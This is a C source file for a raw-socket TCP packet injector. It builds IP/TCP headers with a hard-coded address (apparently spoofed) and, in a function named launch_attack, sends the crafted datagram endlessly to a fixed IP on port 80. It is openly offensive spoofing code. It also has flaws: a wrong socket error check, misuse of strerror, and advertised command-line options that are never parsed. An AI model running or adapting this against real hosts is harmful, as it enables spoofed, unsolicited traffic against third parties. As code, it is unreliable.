#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include "generate_packet.h"

#ifndef DEBUG
#define debug(...)
#else
#define debug(...) (fprintf(stdout, __VA_ARGS__))
#endif

char tcp_generator_help[] = 
    "%s [INPUT] [OPTIONS]: \n"
    "INPUT\n:"
    "   [-i or --interface] network_interface #capture packet from interface \n"
    "   [-d or --dip] destination ip \n"
    "Others:\n"
    "   Destionation port: 80\n"
    "   Protocol: TCP\n";

void launch_attack(char *datagram){

/*    struct ether_header *eh = (struct ether_header *) datagram;
    struct iphdr *iph = (struct iphdr *) (datagram + sizeof(struct ether_header));
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr) + sizeof(struct ether_header));
    char *payload = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct ether_header) + 20);
    
    print_ethernet_header(eh);
    print_ip_header(iph);
    print_tcp_header(tcph);
    print_payload(payload);*/

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sockfd == 0){
        printf("Error creating socket \n");
        exit(0);
    }
    int val = 1;
    int err = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val));
    if(err < 0){
        printf("Error setting socket options \n");
        exit(0);
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr("13.13.13.13");

    while(1){
       err = sendto(sockfd, datagram, 4096, 0, (struct sockaddr *)&sin, sizeof(sin)); 
       if(err < 0)
           printf("Send failed %d error message %s \n", err, strerror(err));
       else
           printf("Successfuly sent packet\n");
       sleep(1);
    }  
}

int generate_packet(char* datagram){

    //struct ether_header *eh; ethernet header is added by OS 
    //eh = (struct ether_header *) datagram;
    //construct_ethernet_header(eh);
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *payload;

    iph = (struct iphdr *) (datagram);
    construct_ip_header(iph, "142.250.182.4");

    tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    construct_tcp_header(tcph);

    payload = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr));
    construct_payload(payload);
    
    return 0;
}

int main(int argc, char *argv[]){

    char datagram[4096];
    memset(datagram, 0, 4096);

    generate_packet(datagram); 
    launch_attack(datagram);
    return 0;
}
